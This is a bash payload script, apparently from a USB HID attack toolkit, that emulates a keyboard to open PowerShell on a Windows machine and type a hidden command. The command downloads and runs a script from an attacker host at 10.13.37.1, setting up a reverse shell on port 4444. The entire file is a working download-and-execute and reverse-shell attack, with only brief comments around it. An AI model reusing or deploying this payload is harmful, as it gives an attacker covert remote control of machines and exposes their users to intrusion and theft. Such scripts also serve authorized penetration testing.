#!/bin/bash
# payloads/hid/reverse_shell_inject.sh

### Description: Injects a PowerShell reverse shell payload over HID keyboard
### Requirements: USB gadget must include HID keyboard + Netcat listener on attacker's side

LHOST="10.13.37.1"
LPORT="4444"

PAYLOAD="powershell -nop -w hidden -c \\\"IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/shell.ps1')\\\""

echo "[+] Executing PowerShell reverse shell injector via HID..."

# Escape double quotes for HID injector
ESCAPED=$(echo "$PAYLOAD" | sed 's/"/\\"/g')

/opt/p4wnp1/tools/hid_injector inject "GUI r"
sleep 1
/opt/p4wnp1/tools/hid_injector type "powershell"
/opt/p4wnp1/tools/hid_injector inject "ENTER"
sleep 1
/opt/p4wnp1/tools/hid_injector type "$ESCAPED"
/opt/p4wnp1/tools/hid_injector inject "ENTER"

echo "[+] Reverse shell command injected. Awaiting connection at $LHOST:$LPORT."

exit 0
